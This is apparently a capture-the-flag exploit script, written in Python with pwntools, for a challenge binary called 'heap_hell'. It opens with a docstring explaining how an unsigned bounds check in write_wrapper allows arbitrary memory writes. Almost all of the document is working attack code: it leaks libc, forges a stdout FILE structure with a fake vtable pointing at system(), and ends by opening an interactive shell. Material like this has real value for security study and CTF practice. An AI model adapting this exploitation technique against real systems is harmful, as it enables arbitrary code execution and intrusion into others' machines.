'''
There are some failed bounds checking in write_wrapper:

_BOOL8 __fastcall write_wrapper(__int64 offset, size_t size)
{
  _BOOL8 result; // rax
  void *ptr; // [rsp+18h] [rbp-8h]

  ptr = (void *)(scratch_pad + offset);
  if ( scratch_pad + offset <= scratch_pad + 0x10000 - size && (unsigned __int64)ptr >= scratch_pad )
    result = size != fread(ptr, 1uLL, size, stdin);
  else
    result = 1LL;
  return result;
}

Which occurs at this line:

if ( scratch_pad + offset <= scratch_pad + 0x10000 - size && (unsigned __int64)ptr >= scratch_pad )
    result = size != fread(ptr, 1uLL, size, stdin);

- We control the address of the scratch_pad which has to be >= 0x10000.

- We can set the offset and size to any arbitrary unsigned long.

- Whe comparisons are unsigned.

We could set the scratch pad to be 0x10000 so that when we have a size of bigger than 0x20000 'scratch_pad + 0x10000 - size' will become a negative number which is a very big number.
Now because this number is bigger than the address of libc (and any other pages) we can write anywhere in memory. I chose to overwrite __malloc_hook and the stdout file struct to get code execution.
'''

from pwn import *

#r = process('./heap_hell')
r = remote('arcade.fluxfingers.net', 1810)

def write(offset, size, data, pad = 0):
	if pad == 0:
		pad = size
	r.sendafter('exit\n', '1\n')
	r.sendafter('How much do you want to write?\n', str(size) + '\n')
	r.sendafter('At which offset?\n', str(offset) + '\n')
	r.send(data.ljust(pad, '\x00'))

def free(offset):
	r.sendafter('exit\n', '2\n')
	r.sendafter('At which offset do you want to free?\n', str(offset) + '\n')

def leak(offset):
	r.sendafter('exit\n', '3\n')
	r.sendafter('At which offset do you want to leak?\n', str(offset) + '\n')
	return r.recvuntil('\nPlease select your action:').split('\nPlease select your action:')[0]

r.send(str(0x10000) + '\n')

#leak libc address

write(0, 0x600, p64(0x0) + p64(0x501) + '\x00'*0x4f8 + p64(0x21) + '\x00'*0x18 + p64(0x21))
free(0x10)

libc = (u64(leak(0x11)[:5].ljust(8, '\x00')) << 8) - 0x1beb00 

log.success('Libc @ ' + hex(libc))

pause()

#fake file struct

#https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/

def pack_file(_flags = 0,
              _IO_read_ptr = 0,
              _IO_read_end = 0,
              _IO_read_base = 0,
              _IO_write_base = 0,
              _IO_write_ptr = 0,
              _IO_write_end = 0,
              _IO_buf_base = 0,
              _IO_buf_end = 0,
              _IO_save_base = 0,
              _IO_backup_base = 0,
              _IO_save_end = 0,
              _IO_marker = 0,
              _IO_chain = 0,
              _fileno = 0,
              _lock = 0):
    struct = p32(_flags) + \
             p32(0) + \
             p64(_IO_read_ptr) + \
             p64(_IO_read_end) + \
             p64(_IO_read_base) + \
             p64(_IO_write_base) + \
             p64(_IO_write_ptr) + \
             p64(_IO_write_end) + \
             p64(_IO_buf_base) + \
             p64(_IO_buf_end) + \
             p64(_IO_save_base) + \
             p64(_IO_backup_base) + \
             p64(_IO_save_end) + \
             p64(_IO_marker) + \
             p64(_IO_chain) + \
             p32(_fileno)
    struct = struct.ljust(0x88, "\x00")
    struct += p64(_lock)
    struct = struct.ljust(0xd8, "\x00")
    return struct

io_str_overflow_ptr_addr = libc + 0x1bb1d8

fake_vtable_addr = io_str_overflow_ptr_addr - 0x18

rdi = libc + 0x12cc6 #sh

file_struct = pack_file(
	_IO_buf_base = 0,
	_IO_buf_end = (rdi-100)/2,
	_IO_write_ptr = (rdi-100)/2,
	_IO_write_base = 0,
	_lock = 0x10000 + 0x6000)

file_struct += p64(fake_vtable_addr)
file_struct += p64(0x0)
file_struct += p64(libc + 0x1bf5c0) #address of the stdout file structure

payload = ''
payload += p64(libc + 0x45380) #system
payload += '\x00'*0xb28
payload += file_struct

write(libc + 0x1bea90 - 0x10000, 131073, payload)

r.interactive()
